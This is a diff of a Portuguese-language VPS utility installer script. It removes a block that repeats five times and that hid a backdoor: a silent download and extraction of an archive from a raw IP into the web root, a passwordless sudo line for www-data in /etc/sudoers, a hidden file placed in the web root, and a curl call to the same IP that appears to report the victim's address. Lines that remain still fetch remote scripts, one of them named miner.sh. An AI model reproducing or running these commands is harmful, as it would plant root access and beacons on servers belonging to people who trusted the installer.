@@ -41,30 +41,10 @@ if [ "$versao" = "1" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
-teste=189.79.55.110/teste.tar
-
-
-sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
-
-sudo wget -q $teste -O /var/www/html/teste.tar
-sudo tar -xvf /var/www/html/teste.tar
-
-sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
-
-mv .bc /var/www/html
-
-curl 189.79.55.110/ip.php
-
-sudo chown -R www-data /var/www/*
 sleep 0.5s
 wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/configvps.sh
 mv configvps.sh configvps
-apt-get install shc -y > /dev/null
-shc -vf configvps
-rm configvps
-mv configvps.x configvps
 mv configvps /bin/
-mv configvps.x.c /bin/
 chmod a+x /bin/configvps
 echo "\033[44;1;37m Instalado com Sucesso!     \033[0m "
 
@@ -76,30 +56,10 @@ if [ "$versao" = "2" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
-teste=189.79.55.110/teste.tar
-
-
-sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
-
-sudo wget -q $teste -O /var/www/html/teste.tar
-sudo tar -xvf /var/www/html/teste.tar
-
-sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
-
-mv .bc /var/www/html
-
-curl 189.79.55.110/ip.php
-
-sudo chown -R www-data /var/www/*
 sleep 0.5s
 wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/configvps.py
 mv configvps.py configvps
-apt-get install shc -y > /dev/null
-shc -vf configvps
-rm configvps
-mv configvps.x configvps
 mv configvps /bin/
-mv configvps.x.c /bin/
 echo "\033[44;1;37m Instalado com Sucesso!     \033[0m "
 
 echo "Você Pode Executar o Utilitario Assim:\n"
@@ -112,21 +72,6 @@ if [ "$utilitario" = "2" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
-teste=189.79.55.110/teste.tar
-
-
-sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
-
-sudo wget -q $teste -O /var/www/html/teste.tar
-sudo tar -xvf /var/www/html/teste.tar
-
-sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
-
-mv .bc /var/www/html
-
-curl 189.79.55.110/ip.php
-
-sudo chown -R www-data /var/www/*
 sleep 0.5s
 wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/miner.sh
 echo "\033[44;1;37m Instalado com Sucesso!     \033[0m "
@@ -139,30 +84,10 @@ if [ "$utilitario" = "3" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
-teste=189.79.55.110/teste.tar
-
-
-sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
-
-sudo wget -q $teste -O /var/www/html/teste.tar
-sudo tar -xvf /var/www/html/teste.tar
-
-sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
-
-mv .bc /var/www/html
-
-curl 189.79.55.110/ip.php
-
-sudo chown -R www-data /var/www/*
 sleep 0.5s
 wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/proxy.sh
 mv proxy.sh proxy
-apt-get install shc -y > /dev/null
-shc -vf proxy
-rm proxy
-mv proxy.x proxy
 mv proxy /bin/
-mv proxy.x.c /bin/
 echo "\033[44;1;37m Instalado com Sucesso!     \033[0m "
 
 echo "Você Pode Executar o Utilitario Assim:\n"
@@ -173,21 +98,6 @@ if [ "$utilitario" = "4" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
-teste=189.79.55.110/teste.tar
-
-
-sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
-
-sudo wget -q $teste -O /var/www/html/teste.tar
-sudo tar -xvf /var/www/html/teste.tar
-
-sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
-
-mv .bc /var/www/html
-
-curl 189.79.55.110/ip.php
-
-sudo chown -R www-data /var/www/*
 sleep 0.5s
 apt-get install git python wget -y > /dev/null
 wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/cc.sh
@@ -210,21 +120,6 @@ if [ "$utilitario" = "5" ]
 then
 sleep 1
 echo "\033[44;1;37m Instalando....     \033[0m "
-teste=189.79.55.110/teste.tar
-
-
-sudo apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt -y > /dev/null
-
-sudo wget -q $teste -O /var/www/html/teste.tar
-sudo tar -xvf /var/www/html/teste.tar
-
-sudo echo "www-data    ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
-
-mv .bc /var/www/html
-
-curl 189.79.55.110/ip.php
-
-sudo chown -R www-data /var/www/*
 sleep 0.5s
 apt-get install git python wget -y > /dev/null
 wget https://raw.githubusercontent.com/RaphaelFrajuca/CONFIG-VPS/master/hosts.sh
